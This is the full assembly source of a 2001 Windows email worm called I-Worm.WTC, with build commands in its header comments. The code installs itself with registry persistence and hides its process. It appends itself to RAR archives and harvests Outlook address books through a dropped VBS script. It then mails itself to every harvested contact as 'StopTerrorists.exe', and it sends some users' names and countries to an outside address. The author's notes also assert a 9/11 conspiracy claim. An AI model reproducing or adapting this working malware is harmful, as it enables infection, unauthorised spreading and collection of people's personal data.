; comment #
; Name : I-Worm.WTC (aka:I-Worm.Super -> It was the first worm's name.)
; Author : PetiK
; Date : September 11th (A great day that we don't forget all around the world) - October 11th
; Size : 8704 byte (compiled with upx tool)
; 
; Action:   Copy itself to
;       * WINDOWS\SYSTEM\Visual8.exe
;   Add in the key HKLM\Software\Microsoft\Windows\CurrentVersion\Run the value
;       * Visual Debugger = WINDOWS\SYSTEM\Visual8.exe
; 
; 
;   It infects all RAR files in the Personal directory.
; 
;   It creates C:\wrm.vbs. This file search and stocks all email in the WAB to the file
;   C:\email.mel. Wait 2 sec. and deletes the vbs file.
; 
;   When the current day is the 11th it displays a messagebox.
; 
; 
; Note of the author.
; -------------------
; After the terrible terrorist attacks, I wanted to do something. I can't destroy the computers
; to show my anger. It's a stupid reaction. I wanted to warn people to help to find the authors
; of this attacks. And I wanted to help myself.
; The target of this worm is not to spread to infect other computers but to help FBI, etc...
; in their investigation.
;
; Note of the September 21st 2009
;
; 8 years after theses attacks, we are sure that the US Government lied to all the world.
; One day, the truth will burst.
; 
; To delete the worm :
; @echo off
; del %windir%\SYSTEM\Visual8.exe
; attrib -H C:\email.mel
; del C:\email.mel
; 
; To built the worm :
; @echo off
; tasm32 /ml /m9 WTC
; tlink32 -Tpe -c -x -aa WTC,,,import32,dllz
; upx -9 WTC.exe
; if exist *.obj del *.obj
; if exist *.map del *.map
; 
; #

.586p
.model flat
.code

JUMPS

api macro a
extrn a:proc
call a
endm

include useful.inc
include myinclude.inc

start:  call    hide_worm
    call    mess_worm

twin_worm:
    push    50
    mov esi,offset orig_worm
    push    esi
    push    0
    api GetModuleFileNameA
    
    mov edi,offset copy_worm
    push    edi
    push    50
    push    edi
    api GetSystemDirectoryA
    add edi,eax
    mov eax,"siV\"
    stosd
    mov eax,"8lau"
    stosd
    mov eax,"exe."
    stosd
    pop edi

    push    0
    push    edi
    push    esi
    api CopyFileA

    push    15
    push    edi
    push    1
    @pushsz "Visual Debugger"
    @pushsz "Software\Microsoft\Windows\CurrentVersion\Run"
    push    80000002h
    api SHSetValueA


special_folder:
    pushad
    push    0
    push    5
    push    offset personal
    push    0
    api SHGetSpecialFolderPathA
    push    offset personal
    api SetCurrentDirectoryA
    call    get_worm_crc

find_first_rar:
    push    offset Search
    @pushsz "*.rar"
    api FindFirstFileA
    inc eax
    je  find_close_rar
    dec eax
    mov [hSearch],eax
i_r:    call    infect_rar
    push    offset Search
    push    [hSearch]
    api FindNextFileA
    test    eax,eax 
    jne i_r
find_close_rar:
    push    [hSearch]
    api FindClose
end_virtual:
    push    8000h
    push    0
    push    [worm_main]
    api VirtualAlloc
end_all_rar:
    popad

call    vbs_file
    push    2 or 20h
    @pushsz "C:\email.mel"
    api SetFileAttributesA

verif_inet:
    push    0
    push    offset inet
    api InternetGetConnectedState
    dec eax
    jnz verif_inet

open_scan_mail:
    pushad
    push    00h
    push    80h
    push    03h
    push    00h
    push    01h
    push    80000000h
    @pushsz "C:\email.mel"
    api CreateFileA
    inc eax
    je  end_spread
    dec eax
    xchg    eax,ebx

    xor eax,eax
    push    eax
    push    eax
    push    eax
    push    2
    push    eax
    push    ebx
    api CreateFileMappingA
    test    eax,eax
    je  end_s1
    xchg    eax,ebp

    xor eax,eax
    push    eax
    push    eax
    push    eax
    push    4
    push    ebp
    api MapViewOfFile
    test    eax,eax
    je  end_s2
    xchg    eax,esi

    push    0
    push    ebx
    api GetFileSize
    cmp eax,3
    jbe end_s3

scan_mail:
    xor edx,edx
    mov edi,offset mail_addr
    push    edi
    p_c:    lodsb
    cmp al," "
    je  car_s
    cmp al,0dh
    je  entr1
    cmp al,0ah
    je  entr2
    cmp al,"%"
    je  f_mail
    cmp al,'@'
    jne not_a
    inc edx
    not_a:  stosb
        jmp p_c
    car_s:  inc esi
        jmp p_c
    entr1:  xor al,al
        stosb
        pop edi
        test edx,edx
        je  scan_mail
        call send_mail
        jmp scan_mail
    entr2:  xor al,al
        stosb
        pop edi
        jmp scan_mail
    f_mail:

end_s3: push    esi
    api UnmapViewOfFile
end_s2: push    ebp
    api CloseHandle
end_s1: push    ebx
    api CloseHandle
end_spread:
    popad

start_page:
    pushad
    mov edi,offset sinet
    call    sinet_size
    dd  160
    sinet_size:
    push    edi
    call    reg
    dd  1
    reg:
    @pushsz "Start Page"
    @pushsz "Software\Microsoft\Internet Explorer\Main"
    push    80000001h
    api SHGetValueA

    call    @web
    db  "http://stcom.net/",0
    db  "http://stcom.net/default2.htm",0
    db  "http://stcom.net/qoqazfr",0
    db  "http://stcom.net/kavkoz",0
    db  "http://stcom.net/falestine",0
    db  "http://stcom.net/oulamah",0
    db  "http://stcom.net/Oulamah",0
    db  "http://stcom.net/An-Nissa",0
    db  "http://stcom.net/ahghanistan",0
    db  "http://www.alesteqlal.com/",0
    @web:
    pop esi
    push    10
    pop ecx
    w_loop:
    push    ecx
    push    esi
    push    offset sinet
    api lstrcmp
    test    eax,eax
    jnz continue
    call    alert_fbi
    jmp end_web
    continue:
    @endsz
    pop ecx
    loop    w_loop
    end_web:
    popad

end_worm:
    push    0
    api ExitProcess

hide_worm:
    pushad
    @pushsz "Kernel32.dll"
    api     GetModuleHandleA
    xchg    eax,ecx
    jecxz   end_hide_worm
    @pushsz "RegisterServiceProcess"
    push    ecx
    api GetProcAddress
    xchg    eax,ecx
    jecxz   end_hide_worm
    push    1
    push    0
    call    ecx
    end_hide_worm:
    popad
    ret

mess_worm:
    pushad
    push    offset SystemTime
    api GetSystemTime
    cmp [SystemTime.wDay],04h
    jne end_mess
    push    40h
    @pushsz "I-Worm.Super coded by PetiK"
    call    @txt
    db  "Because of the different terrorism acts in the USA",0dh,0ah
    db  "I don't will destroy your computer.",0dh,0ah,0dh,0ah
    db  "If you have some informations about the authors or Ben Laden,",0dh,0ah
    db  9,"PLEASE CONTACT THE FBI",0
    @txt:
    push    0
    api MessageBoxA
    end_mess:
    popad
    ret

get_worm_crc    Proc
    pushad
    push    0
    push    80h
    push    3
    push    0
    push    0
    push    80000000h
    push    offset copy_worm
    api CreateFileA
    inc eax
    je  end_all_rar
    dec eax
    mov [hFile],eax

    push    0
    push    eax
    api GetFileSize
    mov [filesize],eax
    mov [RARCompressed],eax
    mov [RAROriginal],eax
    push    eax

    push    4
    push    1000h or 2000h
    push    eax
    push    0
    api VirtualAlloc
    test    eax,eax
    pop edx
    je  end_file
    xchg    eax,ebx
    mov [worm_main],ebx

    push    edx
    push    0
    push    offset tmp
    push    edx
    push    ebx
    push    [hFile]
    api ReadFile

    pop edi
    mov esi,ebx
    call    CRC32
    mov [RARCRC32],eax

    end_file:
    push    [hFile]
    api CloseHandle
    popad
    ret
get_worm_crc    EndP

CRC32   Proc
    push    ecx
    push    edx
    push    ebx
        xor ecx,ecx   
        dec ecx        
        mov edx,ecx   
nxt_byte_crc:           
        xor eax,eax   
        xor ebx,ebx   
        lodsb          
        xor al,cl     
    mov cl,ch
    mov ch,dl
    mov dl,dh
    mov dh,8
nxt_bit_crc:
    shr bx,1
    rcr ax,1
    jnc no_crc
    xor ax,08320h
    xor bx,0EDB8h
no_crc: dec dh
    jnz nxt_bit_crc
    xor ecx,eax
    xor edx,ebx
        dec edi
    jne nxt_byte_crc
    not edx
    not ecx
    pop ebx
    mov eax,edx
    rol eax,16
    mov ax,cx
    pop edx
    pop ecx
    ret
CRC32   EndP

infect_rar  Proc
    pushad
    push    offset Search.cFileName
    api GetFileAttributesA
    cmp eax,1
    je  end_inf
    push    0
    push    80h
    push    3
    push    0
    push    0
    push    80000000h or 40000000h
    push    offset Search.cFileName
    api CreateFileA
    inc eax
    je  end_inf
    dec eax
    xchg    eax,ebx

    push    2
    push    0
    push    0
    push    ebx
    api SetFilePointer

    mov esi,offset RARHeaderCRC+2
    push    end_RAR-RARHeader-2
    pop edi
    call    CRC32                           ;calculate CRC32 of rar header
    mov [RARHeaderCRC],ax

    push    0
    push    offset tmp
    push    end_RAR-RARHeader
    call    end_RAR
RARHeader:
RARHeaderCRC    dw  0
RARType     db  74h
RARFlags    dw  8000h
RARHSize        dw      end_RAR-RARHeader
RARCompressed   dd  2000h
RAROriginal dd  2000h
RAROS       db  0
RARCRC32    dd  0
RARFileDateTime dd      12345678h
RARNeedVer  db  14h
RARMethod   db  30h
RARFNameSize    dw      end_RAR-RARName
RARAttrib   dd  0
RARName     db  'SUPER.EXE'
end_RAR:push    ebx
    api WriteFile           ;write the rar header

    push    0
    push    offset tmp
    push    [filesize]
    push    [worm_main]
    push    ebx
    api WriteFile           ;write the worm

    push    ebx
    api CloseHandle         ;close the file

    push    1
    push    offset Search.cFileName
    api SetFileAttributesA      ;set already-infected mark
end_inf:popad
    ret
infect_rar  EndP


vbs_file    Proc
    pushad
    push    00h
    push    80h
    push    02h
    push    00h
    push    01h
    push    40000000h
    @pushsz "C:\wrm.vbs"
    api CreateFileA
    xchg    eax,ebx

    push    0
    call    @tmp
    dd  ?
    @tmp:
    push    e_vbs - s_vbs
    call    e_vbs
    s_vbs:  db 'On Error Resume Next',CRLF
        db 'Set f=CreateObject("Scripting.FileSystemObject")',CRLF
        db 'Set O=CreateObject("Outlook.Application")',CRLF
        db 'Set M=O.GetNameSpace("MAPI")',CRLF
        db 'Set mel=f.CreateTextFile("C:\email.mel")',CRLF
        db 'mel.Close',CRLF
        db 'For Each N In M.AddressLists',CRLF
        db 'If N.AddressEntries.Count <> 0 Then',CRLF
        db 'For c=1 To N.AddressEntries.Count',CRLF
        db 'Set P=N.AddressEntries(c)',CRLF
        db 'Set mel=f.OpenTextFile("C:\email.mel",8,true)',CRLF
        db 'mel.WriteLine P.Address',CRLF
        db 'mel.Close',CRLF
        db 'Next',CRLF
        db 'End If',CRLF
        db 'Next',CRLF
        db 'Set mel=f.OpenTextFile("C:\email.mel",8,true)',CRLF
        db 'mel.WriteLine "%"',CRLF
        db 'mel.Close',CRLF
    e_vbs:  push    ebx
    api WriteFile
    push    ebx
    api CloseHandle
    push    1
    @pushsz "wscript C:\wrm.vbs"
    api WinExec
    push    5000
    api Sleep
    @pushsz "C:\wrm.vbs"
    api DeleteFileA
    popad
    ret
vbs_file    EndP

send_mail:
    xor eax,eax
    push    eax
    push    eax
    push    offset MsgWrm
    push    eax
    push    [hMAPI]
    api MAPISendMail
    ret

alert_fbi:
    @pushsz "C:\information.txt"
    push    offset sinet
    @pushsz "Start Page of MSIE"
    @pushsz "Information about the suspect written by the Worm"
    api WritePrivateProfileStringA

    mov edi,offset names
    call    name_size
    dd  160
    name_size:
    push    edi
    call    reg2
    dd  1
    reg2:
    @pushsz "RegisteredOwner"
    @pushsz "Software\Microsoft\Windows\CurrentVersion"
    push    80000002h
    api SHGetValueA
    @pushsz "C:\information.txt"
    push    offset names
    @pushsz "Name of the suspect"
    @pushsz "Information about the suspect written by the Worm"
    api WritePrivateProfileStringA

    push    50
    push    offset Systemini
    api GetWindowsDirectoryA
    @pushsz "\Win.ini"
    push    offset Systemini
    api lstrcat
    push    offset Systemini
    push    20
    push    offset org_pays
    push    offset default
    @pushsz "sCountry"
    @pushsz "intl"
    api GetPrivateProfileStringA
    @pushsz "C:\information.txt"
    push    offset org_pays
    @pushsz "Country of the suspect"
    @pushsz "Information about the suspect written by the Worm"
    api WritePrivateProfileStringA

    xor eax,eax
    push    eax
    push    eax
    push    offset MsgFbi
    push    eax
    push    [hMAPI]
    api MAPISendMail
    push    30000
    api Sleep
    @pushsz "C:\information.txt"
    api DeleteFileA
    ret


.data
; === copy_worm ===
orig_worm   db 50 dup (0)
copy_worm   db 50 dup (0)
rar_worm    db 50 dup (0)


; === rar_files ===
personal    db 50 dup (0)
worm_main   dd ?
tmp     dd ?
filesize    dd ?
hFile       dd ?
hSearch     dd ?

; === scan_mail ===
mail_addr   db 128 dup (?)
hMAPI       dd 0
inet        dd 0

; === information ===
sinet       dd 0
names       dd 0
Systemini   db 50 dup (0)
org_pays    db 20 dup(0)
default     db 0

; === gen_mail ===
infofbi     db "C:\information.txt",0
mailfbi     db "newyork@fbi.gov",0
subjectfbi  db "WARNING ABOUT DJIHAD AND PERHAPS BENLADEN !",0
bodyfbi     db "This is a mail written by a worm called "
        db "I-Worm.WTC coded by PetiK.",CRLF
        db "The reason to receive this sort of mail is that the "
        db "worm has found in the somebody's computer the link "
        db "to http://stcom.net or other site web dealing with the djihad.",CRLF,CRLF
        db "You can see some informations about this person with Start Page "
        db "of MSIE, registered owner and the country.",CRLF,CRLF
        db "I hope that it help you in your investigations about the "
        db "terrorist attacks in NYC and Washington DC.",CRLF,CRLF
        db 9,9,"Worm.WTC - PetiK",0


subjectwrm  db "Everybody against the terrorists !",0
bodywrm     db "This freeware will help us to fight the terrorist "
        db "who kill innocent civilians.",CRLF,CRLF
        db 9,"Click at the attached file to see.",00h
name_mail   db "StopTerrorists.exe",00h


MsgFbi      dd ?
        dd offset subjectfbi
        dd offset bodyfbi
        dd ?
        dd ?
        dd ?
        dd 2
        dd offset MsgFrom
        dd 1
        dd offset MsgToFbi
        dd 1
        dd offset AttachFbi

MsgFrom     dd ?
        dd ?
        dd ?
        dd ?
        dd ?
        dd ?

MsgToFbi    dd ?
        dd 1
        dd ?
        dd offset mailfbi
        dd ?
        dd ?

AttachFbi   dd ?
        dd ?
        dd ?
        dd offset infofbi
        dd ?
        dd ?

MsgWrm      dd ?
        dd offset subjectwrm
        dd offset bodywrm
        dd ?
        dd ?
        dd ?
        dd 2
        dd offset MsgFrom
        dd 1
        dd offset MsgToWrm
        dd 1
        dd offset AttachWrm


MsgToWrm    dd ?
        dd 1
        dd ?
        dd offset mail_addr
        dd ?
        dd ?

AttachWrm   dd ?
        dd ?
        dd ?
        dd offset orig_worm
        dd offset name_mail
        dd ?


signature   db "I-Worm.WTC",00h
author      db "Coded by PetiK - 2001",00h

end start
end
